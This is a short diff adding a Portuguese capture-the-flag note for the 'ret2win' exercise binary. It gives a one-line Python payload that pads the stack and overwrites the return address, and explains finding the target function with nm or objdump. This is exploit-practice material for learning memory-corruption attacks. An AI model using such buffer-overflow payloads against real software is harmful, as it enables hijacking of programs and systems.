@@ -1,0 +1,4 @@
+Payload: python2 -c 'print "\x90"*40 + "\x56\x07\x40\x00\x00\x00\x00\x00"' | ./ret2win 
+
+utilizamos o nm ou o objdump para ver os simbolos das funções e pegamos a função chamada ret2wim
+estouramos o buffer e colocamos no rsp o endereço da label
